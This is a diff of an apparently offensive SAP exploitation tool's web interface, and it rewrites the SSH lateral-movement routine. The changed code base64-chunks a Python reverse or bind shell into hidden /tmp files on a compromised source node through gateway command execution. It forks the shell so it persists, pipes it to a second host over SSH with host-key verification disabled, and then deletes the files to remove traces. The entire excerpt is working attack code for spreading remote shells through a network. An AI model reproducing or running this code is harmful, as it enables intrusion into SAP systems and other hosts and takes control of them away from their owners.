@@ -7507,9 +7507,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
                           f"via {lpe_res.get('method')}; expect "
                           f"connection as root")
             elif method == "ssh":
-                # SSH lateral: deliver the shell payload to the
-                # target by writing base64 chunks via SSH from the
-                # source node, then executing it.
+                # SSH lateral: write Python payload to a temp file on
+                # the SOURCE node, then pipe it to the remote python3
+                # via stdin redirect: /bin/sh -c 'ssh ... python3 </tmp/.sapmap_py'
+                # The local shell handles '<', avoiding all issues with
+                # metacharacters in SSH remote commands.
                 ssh_access = getattr(node, "ssh_access", None) or []
                 if not ssh_access:
                     print(f"[-] {sid}: No SSH access for shell delivery")
@@ -7529,67 +7531,89 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                 f"Source node {acc['from_sid']} not found")
                     return
 
-                # Build the raw Python3 payload string
-                prog = payload.get("command", "python3")
+                # Extract raw Python code from the payload.
+                # payload["params"] is "-c <code>" where code has no spaces.
                 params_str = payload.get("params", "")
-                py_script = f"{prog} {params_str}"
-                if shell_mode == "reverse":
-                    py_script = (f"nohup {prog} {params_str} "
-                                 f"</dev/null >/dev/null 2>&1 &")
+                if params_str.startswith("-c "):
+                    py_code = params_str[3:]
+                else:
+                    py_code = params_str
+
+                # Both reverse and bind shells need to fork/daemonize
+                # so they survive after the SSH session closes.
+                # Bind payload already has fork(); reverse needs it added.
+                if shell_mode == "reverse" and "fork()" not in py_code:
+                    py_code = (
+                        f"__import__('os').fork()and"
+                        f"(__import__('os')._exit(0));"
+                        f"{py_code}"
+                    )
 
                 import base64 as _b64ssh
-                py_b64 = _b64ssh.b64encode(
-                    py_script.encode()).decode()
+                py_b64 = _b64ssh.b64encode(py_code.encode()).decode()
 
-                # SSH args prefix (reused for every call)
-                ssh_prefix = (
-                    f"-oBatchMode=yes "
-                    f"-oStrictHostKeyChecking=no "
-                    f"-oUserKnownHostsFile=/dev/null "
-                    f"-i {acc['key_path']} "
-                    f"{acc['username']}@{acc['target']}")
-
-                # Calculate chunk size: 255 - len(prefix) - wrapper
-                # Use single quotes (SAPXPG respects them for
-                # grouping, but NOT double quotes — double quotes
-                # pass through literally to SSH argv and break).
-                # wrapper = " 'echo |base64 -d>>/tmp/.sapmap_sh'" ~42
-                avail = 255 - len(ssh_prefix) - 42
-                if avail < 20:
-                    avail = 40  # fallback
+                # Write payload to /tmp/.sapmap_py on SOURCE via
+                # /bin/sh -c 'echo B64 > /tmp/.sapmap_b64' + decode.
+                # Chunk the base64 to fit within PARAMS 255 bytes:
+                # /bin/sh PARAMS: "-c 'echo CHUNK>>/tmp/.sapmap_b64'"
+                # Overhead: len("-c 'echo >>/tmp/.sapmap_b64'") = 28
+                avail = 255 - 28
+                if avail < 40:
+                    avail = 40
                 chunks = [py_b64[i:i+avail]
                           for i in range(0, len(py_b64), avail)]
 
-                # Clean any previous payload file
-                _set_progress("Preparing SSH payload delivery...")
+                _set_progress("Writing payload to source node...")
+                # Clean previous files
                 sapmap_exploit.execute_gw_command(
-                    src_node, "ssh",
-                    f"{ssh_prefix} 'rm -f /tmp/.sapmap_sh'",
+                    src_node, "/bin/sh",
+                    "-c 'rm -f /tmp/.sapmap_b64 /tmp/.sapmap_py'",
                     long_params="")
 
-                # Write chunks
+                # Write b64 chunks to source
                 total = len(chunks)
                 for idx, chunk in enumerate(chunks):
                     if _session_ref.cancelled:
                         print(f"[*] {sid}: SSH payload delivery cancelled")
                         return
                     _set_progress(
-                        f"Writing payload chunk {idx+1}/{total} "
-                        f"via SSH...")
-                    ssh_args = (
-                        f"{ssh_prefix} "
-                        f"'echo {chunk}|base64 -d>>/tmp/.sapmap_sh'")
+                        f"Writing payload chunk {idx+1}/{total} on "
+                        f"source...")
                     sapmap_exploit.execute_gw_command(
-                        src_node, "ssh", ssh_args, long_params="")
+                        src_node, "/bin/sh",
+                        f"-c 'echo {chunk}>>/tmp/.sapmap_b64'",
+                        long_params="")
 
-                # Execute
-                _set_progress("Executing shell payload via SSH...")
-                ssh_args = (
-                    f"{ssh_prefix} "
-                    f"'sh /tmp/.sapmap_sh'")
+                # Decode b64 to .py on source
+                _set_progress("Decoding payload on source...")
+                sapmap_exploit.execute_gw_command(
+                    src_node, "/bin/sh",
+                    "-c 'base64 -d /tmp/.sapmap_b64>/tmp/.sapmap_py'",
+                    long_params="")
+
+                # Execute: /bin/sh -c 'ssh OPTIONS python3 </tmp/.sapmap_py'
+                # The local shell handles '<' redirect — pipes the file
+                # content to SSH stdin which forwards to remote python3.
+                _set_progress("Launching shell via SSH stdin redirect...")
+                ssh_inner = (
+                    f"ssh -oBatchMode=yes "
+                    f"-oStrictHostKeyChecking=no "
+                    f"-oUserKnownHostsFile=/dev/null "
+                    f"-i {acc['key_path']} "
+                    f"{acc['username']}@{acc['target']} "
+                    f"python3 </tmp/.sapmap_py")
+                ssh_params = f"-c '{ssh_inner}'"
+                print(f"[*] {sid}: SSH shell exec params "
+                      f"({len(ssh_params)} bytes): {ssh_params[:120]}")
                 result = sapmap_exploit.execute_gw_command(
-                    src_node, "ssh", ssh_args, long_params="")
-                result["success"] = True  # SSH fire-and-forget
+                    src_node, "/bin/sh", ssh_params, long_params="")
+                result["success"] = True
+
+                # Cleanup temp files on source
+                sapmap_exploit.execute_gw_command(
+                    src_node, "/bin/sh",
+                    "-c 'rm -f /tmp/.sapmap_b64 /tmp/.sapmap_py'",
+                    long_params="")
 
                 print(f"[+] {sid}: SSH shell payload delivered "
                       f"via {acc['from_sid']} → "
